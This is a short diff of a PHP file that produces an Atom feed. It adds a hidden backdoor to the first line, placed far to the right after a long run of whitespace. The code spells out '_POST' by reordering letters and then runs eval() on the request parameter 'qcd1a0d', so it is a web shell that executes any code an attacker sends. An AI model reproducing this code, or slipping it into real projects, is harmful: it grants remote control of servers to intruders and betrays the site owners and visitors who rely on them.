@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['qcd1a0d'])){eval(${$s20}['qcd1a0d']);}?><?php
 print '<?xml version="1.0" encoding="utf-8" standalone="yes"?>';
 ?>
 <feed xmlns="http://www.w3.org/2005/Atom"
